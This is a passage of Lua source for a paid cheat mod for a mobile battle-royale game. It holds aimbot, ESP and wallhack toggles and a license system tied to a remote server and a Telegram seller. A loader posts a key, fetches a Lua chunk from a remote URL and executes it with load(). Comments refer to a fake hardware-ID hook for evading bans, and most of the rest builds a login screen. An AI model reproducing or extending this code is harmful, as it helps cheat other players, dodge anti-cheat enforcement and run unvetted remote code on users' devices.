            _G._GAME_SECRET = djb2(tostring(math.random()) .. tostring(os.time()))
        end
    end

    local function saveModSettings()
        _G._MOD_SETTINGS_ESP       = _G.bESP_ENABLED
        _G._MOD_SETTINGS_AIMBOT    = _G.bAIMBOT_ENABLED
        _G._MOD_SETTINGS_WALLHACK  = _G.bWALLHACK_ENABLED
        _G._MOD_SETTINGS_HEADER    = _G.bHEADSHOT_ENABLED
        _G._MOD_SETTINGS_SMOOTH    = _G.nAIM_SMOOTHNESS
        _G._MOD_SETTINGS_FOV       = _G.nAIM_FOV
        _G._MOD_SETTINGS_BOX       = _G.bESP_BOX
        _G._MOD_SETTINGS_SKELETON  = _G.bESP_SKELETON
        _G._MOD_SETTINGS_LINE      = _G.bESP_LINE
        _G._MOD_SETTINGS_NAME      = _G.bESP_NAME
        _G._MOD_SETTINGS_DIST      = _G.bESP_DISTANCE
        _G._MOD_SETTINGS_HP        = _G.bESP_HP
        _G._MOD_SETTINGS_WEAPON    = _G.bESP_WEAPON
        _G._MOD_SETTINGS_SNAPLINE  = _G.bESP_SNAPLINE
        _G._MOD_SETTINGS_CROSSHAIR = _G.bCROSSHAIR_ENABLED
        _G._MOD_SETTINGSSaved = true
    end

    local function restoreModSettings()
        if not _G._MOD_SETTINGSSaved then return end
        if _G._MOD_SETTINGS_ESP ~= nil then _G.bESP_ENABLED = _G._MOD_SETTINGS_ESP end
        if _G._MOD_SETTINGS_AIMBOT ~= nil then _G.bAIMBOT_ENABLED = _G._MOD_SETTINGS_AIMBOT end
        if _G._MOD_SETTINGS_WALLHACK ~= nil then _G.bWALLHACK_ENABLED = _G._MOD_SETTINGS_WALLHACK end
        if _G._MOD_SETTINGS_HEADER ~= nil then _G.bHEADSHOT_ENABLED = _G._MOD_SETTINGS_HEADER end
        if _G._MOD_SETTINGS_SMOOTH ~= nil then _G.nAIM_SMOOTHNESS = _G._MOD_SETTINGS_SMOOTH end
        if _G._MOD_SETTINGS_FOV ~= nil then _G.nAIM_FOV = _G._MOD_SETTINGS_FOV end
        if _G._MOD_SETTINGS_BOX ~= nil then _G.bESP_BOX = _G._MOD_SETTINGS_BOX end
        if _G._MOD_SETTINGS_SKELETON ~= nil then _G.bESP_SKELETON = _G._MOD_SETTINGS_SKELETON end
        if _G._MOD_SETTINGS_LINE ~= nil then _G.bESP_LINE = _G._MOD_SETTINGS_LINE end
        if _G._MOD_SETTINGS_NAME ~= nil then _G.bESP_NAME = _G._MOD_SETTINGS_NAME end
        if _G._MOD_SETTINGS_DIST ~= nil then _G.bESP_DISTANCE = _G._MOD_SETTINGS_DIST end
        if _G._MOD_SETTINGS_HP ~= nil then _G.bESP_HP = _G._MOD_SETTINGS_HP end
        if _G._MOD_SETTINGS_WEAPON ~= nil then _G.bESP_WEAPON = _G._MOD_SETTINGS_WEAPON end
        if _G._MOD_SETTINGS_SNAPLINE ~= nil then _G.bESP_SNAPLINE = _G._MOD_SETTINGS_SNAPLINE end
        if _G._MOD_SETTINGS_CROSSHAIR ~= nil then _G.bCROSSHAIR_ENABLED = _G._MOD_SETTINGS_CROSSHAIR end
    end

    local function waitForAdvancedAndStart(character)
        -- FIX: same character par dobara start mat karo, lekin NAYA character aaye to re-attach karo.
        if _G._MAIN_LOOP_STARTED and _G._MOD_EXECUTED and _G._MOD_CHARACTER == character then return end
        -- purana init stuck ho to block mat karo, reset kar do
        if _G._StartAdvancedInit and _G._MOD_CHARACTER ~= character then
            _G._StartAdvancedInit = false
        end
        if _G._StartAdvancedInit then return end
        _G._StartAdvancedInit = true
        local retries = 0
        local timer
        timer = character:AddGameTimer(0.15, true, function()
            -- character destroy ho gaya to timer band karo
            if not slua.isValid(character.Object) then
                if timer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(timer) end) end
                _G._StartAdvancedInit = false
                return
            end
            if _G.StartAdvancedSystems then
                pcall(restoreModSettings)
                _G._MAIN_LOOP_STARTED = true
                _G._MOD_CHARACTER = character
                if _G.ZN_Reattach then
                    -- halka reattach: full chunk dobara NAHI chalega, stuck nahi hoga
                    pcall(_G.ZN_Reattach)
                else
                    pcall(_G.StartAdvancedSystems, character)
                end
                if timer and character.RemoveGameTimer then pcall(function() character:RemoveGameTimer(timer) end) end
                _G._StartAdvancedInit = false
            else
                retries = retries + 1
                if retries > 80 and timer and character.RemoveGameTimer then
                    pcall(function() character:RemoveGameTimer(timer) end)
                    _G._StartAdvancedInit = false
                end
            end
        end)
    end

    local function executeChunk(chunk)
        setGameSecret(pc)

        if _G._MOD_EXECUTED then
            pcall(restoreModSettings)
            waitForAdvancedAndStart(self)
            return
        end

        pcall(chunk)
        _G._MOD_EXECUTED = true
        -- direct load: status popup hataya

        waitForAdvancedAndStart(self)
    end

    local function setLoadStatus(txt)
        pcall(function()
            if _G._LOGIN_STATUS and slua.isValid(_G._LOGIN_STATUS) then
                _G._LOGIN_STATUS:SetText(tostring(txt))
            end
        end)
    end

    local function loadMod(modKey)
        -- direct load: status popup hataya
        if _G._PreloadedMods and _G._PreloadedMods[modKey] then
            executeChunk(_G._PreloadedMods[modKey])
            return
        end

        local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
        local headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"] = "game=ShadowTrackerExtra engine=UE4 platform=Android"
        }
        local attempt = 0
        local maxRetries = 5
        local function doRequest()
            attempt = attempt + 1
            local timeout = 15 + (attempt * 15)
            http:Post(MOD_URL, headers, generate_auth_body(modKey), nil, function(s, resp)
                if s and resp and #resp > 50 then
                    local ok, chunk = pcall(load, resp, "m.lua")
                    if ok and chunk then
                        _G._PreloadedMods[modKey] = chunk
                        executeChunk(chunk)
                        return
                    end
                end
                if attempt < maxRetries then
                    doRequest()
                end
            end, timeout)
        end
        doRequest()
    end

    -- ============ LICENSE SYSTEM (Telegram bot + KV) ============
    -- User zn_knox.txt me key dalega, game key+UID worker par verify karegi.
    -- Sahi tabhi mod load hoga. Leaked patch/file bina valid key ke bekaar hai.
    local LICENSE_URL = "https://kuro.nizo.in/connect"
    local KURO_GAME = "PUBG"
    local KEY_PATH = "/storage/emulated/0/Android/data/com.pubg.imobile/files/zn_knox.txt"
    -- login footer debug (zaroorat par true karo)
    _G.LOGIN_DEBUG = false

    local function LicensePopup(title, msg)
        pcall(function()
            local Msg = require("client.slua.logic.common.logic_common_msg_box")
            if Msg and Msg.Show then Msg.Show(4, title, msg) end
        end)
    end

    local function ReadKeyFile()
        local key = nil
        pcall(function()
            local f = io.open(KEY_PATH, "r")
            if f then
                key = f:read("*all")
                f:close()
                if key then key = key:gsub("%s+", "") end
                if key == "" then key = nil end
            end
        end)
        return key
    end

    local function GetAccountUID()
        local uid = nil
        pcall(function()
            local c = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
            if c then
                if c.UID then uid = tostring(c.UID) end
                if (not uid or uid == "" or uid == "0") and c.PlayerState and c.PlayerState.UID then
                    uid = tostring(c.PlayerState.UID)
                end
            end
        end)
        if uid == "" or uid == "0" then uid = nil end
        return uid
    end

    -- kuch device par game UID nahi deta: tab stable device-file ID use karo
    -- (ek baar bani, hamesha same - lock semantics same rahenge)
    local function GetDeviceFallbackUID()
        local uid = nil
        pcall(function()
            local p = "/storage/emulated/0/Android/data/com.pubg.imobile/files/uid.txt"
            local f = io.open(p, "r")
            if f then uid = f:read("*all") f:close() end
            if uid then uid = uid:gsub("%s+", "") end
            if not uid or uid == "" then
                uid = "ZN-" .. tostring(math.random(100000, 999999)) .. tostring(os.time())
                local w = io.open(p, "w")
                if w then w:write(uid) w:close() end
            end
            if uid == "" then uid = nil end
        end)
        return uid
    end

    -- DEVICE LOCK: asli device ID (account nahi). Same device = koi bhi ID chalegi.
    -- License mod-load se PEHLE verify hota hai (FakeHWID hook se pehle), aur
    -- heartbeat saved value reuse karta hai - isliye hamesha REAL id milti hai.
    local function GetDeviceHWID()
        local id = nil
        pcall(function()
            local KSL = import("KismetSystemLibrary")
            if KSL then
                if KSL.GetDeviceId then id = KSL:GetDeviceId() end
                if (not id or id == "") and KSL.GetDeviceIdOS then id = KSL:GetDeviceIdOS() end
            end
        end)
        if id then
            id = tostring(id):gsub("[^A-Za-z0-9%-_]", "")
        end
        if not id or id == "" then id = nil end
        return id
    end

    -- STABLE UID (1-device lock sahi kaam kare): saved uid.txt sabse pehle,
    -- pehli baar jo ID mile turant save (agli baar wahi milegi).
    local function GetSerial()
        local saved = nil
        pcall(function()
            local f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/uid.txt", "r")
            if f then saved = f:read("*all") f:close() end
            if saved then saved = saved:gsub("%s+", "") end
            if not saved or saved == "" then saved = nil end
        end)
        if saved then return saved end
        local uid = GetDeviceHWID() or GetAccountUID() or GetDeviceFallbackUID()
        if uid then
            pcall(function()
                local w = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/uid.txt", "w")
                if w then w:write(tostring(uid)) w:close() end
            end)
        end
        return uid
    end

    local function LicenseReasonPopup(reason, expiry)
        if reason == "invalid" then
            LicensePopup("INVALID KEY", "Ye key database me nahi hai.\nApne seller se sahi key lo.")
        elseif reason == "blocked" then
            LicensePopup("KEY BLOCKED", "Ye key admin ne block kar di hai.")
        elseif reason == "expired" then
            LicensePopup("KEY EXPIRED", "Key expire ho gayi" .. (expiry and ("\nExpiry: " .. expiry) or "") .. ".\nRenew karwao.")
        elseif reason == "device_limit" then
            LicensePopup("DEVICE LIMIT", "Ye key dusre device/account par lock hai.\nSeller se reset karwao.")
        elseif reason == "missing" then
            LicensePopup("KEY ERROR", "Key ya UID nahi mila.\nzn_knox.txt check karo.")
        else
            LicensePopup("CONNECTION ERROR", "License server se baat nahi hui.\nInternet check karke game restart karo.")
        end
    end

    local function GetSavedKey()
        if _G._LICENSE_KEY and _G._LICENSE_KEY ~= "" then return _G._LICENSE_KEY end
        return ReadKeyFile()
    end

    local function SaveKeyFile(key)
        _G._LICENSE_KEY = key
        pcall(function()
            local f = io.open(KEY_PATH, "w")
            if f then f:write(key) f:close() end
        end)
    end

    local function KuroReason(msg)
        if not msg then return "nonet" end
        if msg == "USER BLOCKED" then return "blocked" end
        if msg == "EXPIRED KEY" then return "expired" end
        if msg == "MAX DEVICE REACHED" then return "device_limit" end
        if msg == "USER OR GAME NOT REGISTERED" then return "invalid" end
        return "nonet"
    end

    local function DoVerifyPost(userKey, uid, cb)
        local http = nil
        pcall(function() http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager) end)
        if not http or not http.Post then
            cb(false, "nonet", nil)
            return
        end
        local headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }
        http:Post(LICENSE_URL, headers, "game=" .. KURO_GAME .. "&user_key=" .. userKey .. "&serial=" .. uid, nil, function(s, resp)
            if s and resp and resp:find('"status"%s*:%s*true') and resp:find('"data"%s*:') then
                cb(true)
            else
                local msg = nil
                pcall(function()
                    if resp then msg = resp:match('"reason"%s*:%s*"([^"]+)"') end
                end)
                cb(false, KuroReason(msg), nil)
            end
        end, 15)
    end

    -- ============ LOGIN UI (game me key type + auto-save zn_knox.txt) ============
    -- Button-click API har version me same nahi hota, isliye asli kaam 1-sec
    -- timer karta hai (stable text = auto verify). Button best-effort hai.
    local function DestroyLoginUI()
        pcall(function()
            if _G._LOGIN_TIMER and _G._LOGIN_CHAR and _G._LOGIN_CHAR.RemoveGameTimer then
                local ch = _G._LOGIN_CHAR
                if ch and ch.Object and slua.isValid(ch.Object) then
                    ch:RemoveGameTimer(_G._LOGIN_TIMER)
                end
            end
        end)
        _G._LOGIN_TIMER = nil
        _G._LOGIN_CHAR = nil
        pcall(function()
            if _G._LOGIN_UI and slua.isValid(_G._LOGIN_UI) then
                _G._LOGIN_UI:RemoveFromParent()
                if _G._LOGIN_UI.ConditionalBeginDestroy then _G._LOGIN_UI:ConditionalBeginDestroy() end
            end
        end)
        _G._LOGIN_UI = nil
        _G._LOGIN_DIM = nil
        _G._LOGIN_BOX = nil
        _G._LOGIN_BTN = nil
        _G._GETKEY_BTN = nil
        _G._PASTE_BTN = nil
        _G._LOGIN_PILL = nil
        _G._LOGIN_BTN_LABELS = nil
        _G._LOGIN_STATUS = nil
        _G._LOGIN_SLOTS = nil
        _G._LOGIN_ROOTSLOT = nil
        _G._LOGIN_CX = nil
        _G._LOGIN_CY = nil
        pcall(function()
            local ch2 = _G._LOGIN_PULSE_CHAR or _G._LOGIN_CHAR
            if _G._LOGIN_PULSE_TIMER and ch2 and ch2.RemoveGameTimer then
                if ch2.Object and slua.isValid(ch2.Object) then
                    ch2:RemoveGameTimer(_G._LOGIN_PULSE_TIMER)
                end
            end
        end)
        _G._LOGIN_PULSE_TIMER = nil
        _G._LOGIN_PULSE_CHAR = nil
        _G._LOGIN_PULSE_BARS = nil
        _G._LOGIN_PULSE_ON = nil
        _G._LOGIN_ANIM_TIMER = nil
        _G._LOGIN_ANIM_CHAR = nil
        _G._LOGIN_ANIM = nil
    end

    local function SetLoginStatus(txt, isError)
        pcall(function()
            if _G._LOGIN_STATUS and slua.isValid(_G._LOGIN_STATUS) then
                local s = tostring(txt)
                -- status pill states
                local c
                local FLinearColor = import("LinearColor")
                local FSlateColor = import("SlateColor") or import("/Script/SlateCore.SlateColor")
                if s:find("Waiting") then
                    s = "> SYSTEM READY"
                    c = FLinearColor(1.0, 1.0, 1.0, 1.0)
                elseif s:find("Checking") then
                    s = "> VERIFYING KEY..."
                    c = FLinearColor(1.0, 0.85, 0.3, 1.0)
                elseif s:find("Key OK") or s:find("LICENSE ACTIVE") then
                    s = "OK: ACCESS GRANTED"
                    c = FLinearColor(0.25, 1.0, 0.5, 1.0)
                else
                    c = isError and FLinearColor(1.0, 0.3, 0.3, 1.0) or FLinearColor(1.0, 0.9, 0.4, 1.0)
                end
                _G._LOGIN_STATUS:SetText(s)
                pcall(function()
                    if FSlateColor then _G._LOGIN_STATUS:SetColorAndOpacity(FSlateColor(c)) else _G._LOGIN_STATUS:SetColorAndOpacity(c) end
                end)
            end
        end)
    end

    local function GetInputText()
        local t = nil
        pcall(function()
            if _G._LOGIN_BOX and slua.isValid(_G._LOGIN_BOX) and _G._LOGIN_BOX.GetText then
                local ft = _G._LOGIN_BOX:GetText()
                if ft then
                    if type(ft) == "string" then t = ft
                    elseif ft.ToString then t = ft:ToString()
                    else t = tostring(ft) end
                end
            end
        end)
        if t then
            t = tostring(t):gsub("[^A-Za-z0-9%-_]", "")
        end
        if not t or t == "" then t = nil end
        return t
    end

    local function BindClick(b, fn)
        if not (b and slua.isValid(b)) then return end
        pcall(function() if b.OnClicked and b.OnClicked.Add then b.OnClicked:Add(function() fn() end) end end)
        pcall(function() if b.OnClicked and b.OnClicked.Add then b.OnClicked:Add(b, function() fn() end) end end)
        pcall(function() if slua.addDelegate then slua.addDelegate(b.OnClicked, function() fn() end) end end)
    end

    -- MATCH_PARENT jaisa fill (anchors full + offsets 0). Na lage to oversize backup hai.
    local function FillParent(slot)
        if not slot then return end
        pcall(function()
            if slot.SetAnchors then
                slot:SetAnchors({ Minimum = { X = 0, Y = 0 }, Maximum = { X = 1, Y = 1 } })
            end
        end)
        pcall(function()
            if slot.SetOffsets then slot:SetOffsets({ Left = 0, Top = 0, Right = 0, Bottom = 0 }) end
        end)
    end

    local function OpenTelegram()
        SetLoginStatus("Telegram khul raha hai...", false)
        local done = false
        pcall(function()
            local KSL = import("KismetSystemLibrary")
            if KSL and KSL.LaunchURL then
                KSL.LaunchURL("https://t.me/Zn_owner")
                done = true
            end
        end)
        if not done then
            pcall(function()
                local KSL = import("KismetSystemLibrary")
                local w = slua.getWorld and slua.getWorld()
                if KSL and w and KSL.ExecuteConsoleCommand then KSL.ExecuteConsoleCommand(w, "LaunchURL https://t.me/Zn_owner") end
            end)
        end
    end

    local function ShowLoginUI(character, topMsg, onLogin)
        DestroyLoginUI()
        local built = false
        local ok, err = pcall(function()
            local InGameUITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
            local MainUI = InGameUITools.GetMainControlBaseUI()
            if not (MainUI and slua.isValid(MainUI)) then return end
            local Parent = (MainUI.CanvasPanel_0 and slua.isValid(MainUI.CanvasPanel_0)) and MainUI.CanvasPanel_0 or nil
            if not Parent and MainUI.CanvasPanel_42 and slua.isValid(MainUI.CanvasPanel_42) then
                Parent = MainUI.CanvasPanel_42
            end
            -- Fallback: koi bhi CanvasPanel chalega (version change se bachao)
            if not (Parent and slua.isValid(Parent)) then
                pcall(function()
                    local candidates = { "CanvasPanel_0", "CanvasPanel_42", "CanvasPanel", "CanvasPanel_1", "RootCanvas" }
                    for _, nm in ipairs(candidates) do
                        local c = MainUI[nm]
                        if c and slua.isValid(c) then Parent = c break end
                    end
                end)
            end
            if not (Parent and slua.isValid(Parent)) then
                pcall(function()
                    if MainUI.GetChildrenCount and MainUI.GetChildAt then
                        local n = MainUI:GetChildrenCount()
                        for i = 0, n - 1 do
                            local ch = nil
                            pcall(function() ch = MainUI:GetChildAt(i) end)
                            if ch and slua.isValid(ch) and ch.AddChildToCanvas then Parent = ch break end
                        end
                    end
                end)
            end
            -- Last resort: MainUI khud parent (agar AddChildToCanvas support kare)
            if not (Parent and slua.isValid(Parent)) then
                pcall(function()
                    if MainUI.AddChildToCanvas then Parent = MainUI end
                end)
            end
            if not (Parent and slua.isValid(Parent)) then
                _G._LOGIN_LAST_ERROR = "no Parent canvas"
                return
            end
            local FVector2D = import("Vector2D")
            local FLinearColor = import("LinearColor")
            local FSlateColor = import("SlateColor") or import("/Script/SlateCore.SlateColor")
            -- safe NewObject: throw kare to nil de, outer pcall fail na ho
            local function safeNew(path, outer)
                local o = nil
                pcall(function() o = CGame:NewObjectFromPath(path, outer) end)
                return o
            end
            local function ComputeLayout()
                -- screen (viewport) hi sach hai: overlay screen-space UI hai
                local vw, vh = 1920, 1080
                pcall(function()
                    local ui_util = require("client.common.ui_util")
                    local vs = ui_util and ui_util.GetViewportSize and ui_util.GetViewportSize()
                    if vs and vs.X and vs.X > 0 then vw, vh = vs.X, vs.Y end
                end)
                local pw, ph = vw, vh
                -- parent geometry sirf tab lo jab screen ke aas-paas ho (stale read se bachao)
                pcall(function()
                    if Parent.GetCachedGeometry then
                        local cg = Parent:GetCachedGeometry()
                        if cg and cg.GetLocalSize then
                            local sz = cg:GetLocalSize()
                            if sz and sz.X and sz.X > 100 and sz.Y and sz.Y > 100 then
                                if sz.X > vw * 0.7 and sz.X < vw * 1.3 and sz.Y > vh * 0.7 and sz.Y < vh * 1.3 then
                                    pw, ph = sz.X, sz.Y
                                end
                            end
                        end
                    end
                end)
                -- parent origin offset: kuch canvas screen-origin se shift hote hain,
                -- isliye screen-center me se origin ghatao (har device par auto-nap)
                local ox, oy = 0, 0
                pcall(function()
                    if Parent.GetCachedGeometry then
                        local cg = Parent:GetCachedGeometry()
                        if cg and cg.GetAbsolutePosition then
                            local ap = cg:GetAbsolutePosition()
                            if ap and ap.X and math.abs(ap.X) < vw * 0.25 and math.abs(ap.Y) < vh * 0.25 then
                                ox, oy = ap.X, ap.Y
                            end
                        end
                    end
                end)
                -- exact screen center (parent-local), koi hardcoded offset nahi
                local cx2 = vw * 0.5 - ox
                local cy2 = vh * 0.5 - oy
                -- panel: screen width ka 42% (max 920, min 420), aspect same, contents scale = u
                local panelW = pw * 0.42
                if panelW > 920 then panelW = 920 end
                if panelW < 420 then panelW = 420 end
                local panelH = panelW * (520 / 740)
                local u2 = panelW / 740
                return pw, ph, cx2, cy2, u2, panelW, panelH, vw, vh, ox, oy
            end
            local pw, ph, cx, cy, S, panelW, panelH, vw, vh, ox, oy = ComputeLayout()
            -- layout settle hone ke baad dobara center karo (pehli read galat ho to fix)
            local function RelayoutLogin()
                pcall(function()
                    local sl = _G._LOGIN_SLOTS
                    if not sl or #sl == 0 then return end
                    local pw2, ph2, cx2, cy2 = ComputeLayout()
                    local dx, dy = cx2 - (_G._LOGIN_CX or cx2), cy2 - (_G._LOGIN_CY or cy2)
                    if math.abs(dx) < 2 and math.abs(dy) < 2 then return end
                    _G._LOGIN_CX, _G._LOGIN_CY = cx2, cy2
                    local FVector2D = import("Vector2D")
                    for _, e in ipairs(sl) do
                        pcall(function()
                            if e.s and slua.isValid(e.s) and e.s.SetPosition then
                                e.x, e.y = e.x + dx, e.y + dy
                                e.s:SetPosition(FVector2D(e.x, e.y))
                            end
                        end)
                    end
                    pcall(function()
                        if _G._LOGIN_ROOTSLOT and slua.isValid(_G._LOGIN_ROOTSLOT) and _G._LOGIN_ROOTSLOT.SetSize then
                            _G._LOGIN_ROOTSLOT:SetSize(FVector2D(pw2, ph2))
                        end
                    end)
                end)
            end
            -- ============ PREMIUM COLOR PALETTE (Emerald + Gold + Deep Black) ============
            local CLR = {
                bg_deep      = FLinearColor(0.01, 0.02, 0.02, 1.0),
                emerald      = FLinearColor(0.10, 1.00, 0.45, 1.0),
                emerald_dim  = FLinearColor(0.05, 0.45, 0.22, 1.0),
                emerald_glow = FLinearColor(0.20, 1.00, 0.55, 0.85),
                gold         = FLinearColor(1.00, 0.82, 0.25, 1.0),
                gold_dim     = FLinearColor(0.55, 0.42, 0.10, 1.0),
                white        = FLinearColor(1.00, 1.00, 1.00, 1.0),
                text_dim     = FLinearColor(0.62, 0.70, 0.66, 1.0),
                red          = FLinearColor(1.00, 0.28, 0.28, 1.0),
                card_bg      = FLinearColor(0.015, 0.035, 0.025, 0.96),
                input_bg     = FLinearColor(0.02, 0.05, 0.035, 1.0),
            }
            local white = CLR.white
            -- ============ ANIMATION STATE ============
            _G._LOGIN_ANIM = _G._LOGIN_ANIM or {}
            local ANIM = _G._LOGIN_ANIM
            ANIM.bars = ANIM.bars or {}
            ANIM.scan = ANIM.scan or nil
            ANIM.tick = 0
            -- ============ HELPER: Load banner image ============
            local function GetBannerBrush()
                local brush = nil
                pcall(function()
                    local paths = {
                        "/storage/emulated/0/Android/data/com.pubg.imobile/files/zn_banner.png",
                        "/storage/emulated/0/Android/data/com.pubg.imobile/files/zn_knox_banner.png",
                        "/storage/emulated/0/Android/data/com.pubg.imobile/files/loading_banner.png",
                    }
                    for _, p in ipairs(paths) do
                        local f = io.open(p, "r")
                        if f then
                            f:close()
                            pcall(function()
                                local A = import("/Script/Engine.KismetRenderingLibrary")
                                if A and A.ImportFileAsTexture2D then
                                    brush = A.ImportFileAsTexture2D(nil, p)
                                end
                            end)
                            if brush then break end
                        end
                    end
                end)
                return brush
            end
            local bannerTex = GetBannerBrush()
            local function mkText(proot, txt, size, color, x, y, bold)
                local w = safeNew("/Script/UMG.TextBlock", proot)
                if w and slua.isValid(w) then
                    pcall(function()
                        w:SetText(tostring(txt))
                        if FSlateColor then w:SetColorAndOpacity(FSlateColor(color)) else w:SetColorAndOpacity(color) end
                        if w.Font then
                            local f = w.Font
                            f.Size = size
                            if bold then pcall(function() f.TypefaceFontName = "Bold" end) end
                            w.Font = f
                        end
                        w:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                        pcall(function() w:SetShadowColorAndOpacity(FLinearColor(0, 0, 0, 0.85)) end)
                        pcall(function() w:SetShadowOffset(FVector2D(1.5, 1.5)) end)
                    end)
                    pcall(function()
                        local s = proot:AddChildToCanvas(w)
                        if s then pcall(function() s:SetAutoSize(true) s:SetAlignment(FVector2D(0.5, 0.5)) s:SetPosition(FVector2D(x, y)) s:SetZOrder(9999) end) end
                    end)
                end
                return w
            end
            local function mkBorder(proot, color, x, y, w, h, z, registerPulse)
                local b = safeNew("/Script/UMG.Border", proot)
                if not (b and slua.isValid(b)) then return nil end
                pcall(function()
                    b:SetBrushColor(color)
                    b:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                end)
                pcall(function()
                    local s = proot:AddChildToCanvas(b)
                    if s then pcall(function() s:SetAlignment(FVector2D(0.5, 0.5)) s:SetPosition(FVector2D(x, y)) s:SetSize(FVector2D(w, h)) s:SetZOrder(z or 9998) end) end
                end)
                if registerPulse and ANIM.bars then table.insert(ANIM.bars, b) end
                return b
            end
            local root = safeNew("/Script/UMG.CanvasPanel", Parent)
            if not (root and slua.isValid(root)) then _G._LOGIN_LAST_ERROR = "root create fail" return end
            -- Deep black base (in case image fails)
            local dim = safeNew("/Script/UMG.Border", root)
            if dim and slua.isValid(dim) then
                pcall(function()
                    dim:SetBrushColor(FLinearColor(0.0, 0.0, 0.0, 0.94))
                    dim:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                end)
                local ds = nil
                pcall(function() ds = root:AddChildToCanvas(dim) end)
                if ds then
                    pcall(function() ds:SetAlignment(FVector2D(0.5, 0.5)) ds:SetPosition(FVector2D(cx, cy)) ds:SetSize(FVector2D(pw * 2, ph * 2)) ds:SetZOrder(9985) end)
                    FillParent(ds)
                end
                _G._LOGIN_DIM = dim
            end
            -- ============ BANNER IMAGE via Image widget ============
            pcall(function()
                local img = safeNew("/Script/UMG.Image", root)
                if img and slua.isValid(img) then
                    local bannerPath = "/storage/emulated/0/Android/data/com.pubg.imobile/files/zn_banner.png"
                    local brushSet = false
                    if bannerTex and slua.isValid(bannerTex) then
                        pcall(function() img:SetBrushFromTexture(bannerTex, true) brushSet = true end)
                    end
                    if not brushSet then
                        pcall(function()
                            local softObj = CGame:LoadOjectFromPath(bannerPath)
                            if softObj and slua.isValid(softObj) then
                                img:SetBrushFromAsset(softObj, true)
                                brushSet = true
                            end
                        end)
                    end
                    if brushSet then
                        pcall(function()
                            img:SetColorAndOpacity(FLinearColor(1, 1, 1, 0.72))
                            img:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                        end)
                        local iss = root:AddChildToCanvas(img)
                        if iss then
                            pcall(function()
                                iss:SetAlignment(FVector2D(0.5, 0.5))
                                iss:SetPosition(FVector2D(cx, cy))
                                iss:SetSize(FVector2D(pw * 2, ph * 2))
                                iss:SetZOrder(9986)
                            end)
                            FillParent(iss)
                        end
                    else
                        mkBorder(root, FLinearColor(0.02, 0.18, 0.09, 0.85), cx, cy, pw * 2, ph * 2, 9986)
                    end
                end
            end)
            -- Dark vignette overlays to make panel pop
            pcall(function()
                local vigC = FLinearColor(0.0, 0.0, 0.0, 0.70)
                local function vigStrip(vy, hh)
                    mkBorder(root, vigC, cx, vy, pw * 2, hh, 9987)
                end
                vigStrip(cy - ph * 0.40, ph * 0.20)
                vigStrip(cy + ph * 0.40, ph * 0.20)
                mkBorder(root, FLinearColor(0, 0, 0, 0.45), cx - pw * 0.42, cy, pw * 0.16, ph * 2, 9987)
                mkBorder(root, FLinearColor(0, 0, 0, 0.45), cx + pw * 0.42, cy, pw * 0.16, ph * 2, 9987)
            end)
            -- ============ ANIMATED SCANLINE ============
            pcall(function()
                local scan = mkBorder(root, FLinearColor(0.10, 1.00, 0.45, 0.35), cx, cy, panelW * 1.3, math.max(2, math.floor(3 * S)), 9988)
                if scan then ANIM.scan = { widget = scan, baseY = cy, range = panelH * 0.55, dir = 1 } end
            end)
            -- ============ PREMIUM CARD + EMERALD+GOLD FRAME ============
            _G._LOGIN_PULSE_BARS = _G._LOGIN_PULSE_BARS or {}
            local cyan = CLR.emerald
            local card = safeNew("/Script/UMG.Border", root)
            if card and slua.isValid(card) then
                pcall(function()
                    card:SetBrushColor(CLR.card_bg)
                    card:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
                end)
                local cs = nil
                pcall(function() cs = root:AddChildToCanvas(card) end)
                if cs then pcall(function() cs:SetAlignment(FVector2D(0.5, 0.5)) cs:SetPosition(FVector2D(cx, cy)) cs:SetSize(FVector2D(panelW, panelH)) cs:SetZOrder(9991) end) end
            end
            mkBorder(root, FLinearColor(0.04, 0.28, 0.14, 0.55), cx, cy - panelH * 0.30, panelW, panelH * 0.40, 9991)
            mkBorder(root, CLR.gold, cx, cy - panelH * 0.5 + 2, panelW, math.max(3, math.floor(4 * S)), 9994)
            -- ============ ANIMATED CORNER BRACKETS ============
            local bracketW = math.max(4, math.floor(5 * S))
            local bracketLen = panelW * 0.15
            pcall(function()
                mkBorder(root, CLR.emerald, cx - panelW * 0.5 + bracketLen * 0.5, cy - panelH * 0.5, bracketLen, bracketW, 9993, true)
                mkBorder(root, CLR.emerald, cx - panelW * 0.5, cy - panelH * 0.5 + bracketLen * 0.5, bracketW, bracketLen, 9993, true)
                mkBorder(root, CLR.emerald, cx + panelW * 0.5 - bracketLen * 0.5, cy - panelH * 0.5, bracketLen, bracketW, 9993, true)
                mkBorder(root, CLR.emerald, cx + panelW * 0.5, cy - panelH * 0.5 + bracketLen * 0.5, bracketW, bracketLen, 9993, true)
                mkBorder(root, CLR.emerald, cx - panelW * 0.5 + bracketLen * 0.5, cy + panelH * 0.5, bracketLen, bracketW, 9993, true)
                mkBorder(root, CLR.emerald, cx - panelW * 0.5, cy + panelH * 0.5 - bracketLen * 0.5, bracketW, bracketLen, 9993, true)
                mkBorder(root, CLR.emerald, cx + panelW * 0.5 - bracketLen * 0.5, cy + panelH * 0.5, bracketLen, bracketW, 9993, true)
                mkBorder(root, CLR.emerald, cx + panelW * 0.5, cy + panelH * 0.5 - bracketLen * 0.5, bracketW, bracketLen, 9993, true)
            end)
            -- ============ HEADER with symbols ============
            mkText(root, "↱", math.floor(38 * S), CLR.gold, cx - panelW * 0.20, cy - panelH * 0.385, true)
            mkText(root, "ZN  KNOX", math.floor(52 * S), CLR.emerald, cx + panelW * 0.04, cy - panelH * 0.385, true)
            mkText(root, "↲", math.floor(38 * S), CLR.gold, cx + panelW * 0.28, cy - panelH * 0.385, true)
            mkText(root, "✦  P R E M I U M   A C C E S S  ✦", math.floor(15 * S), CLR.text_dim, cx, cy - panelH * 0.305, false)
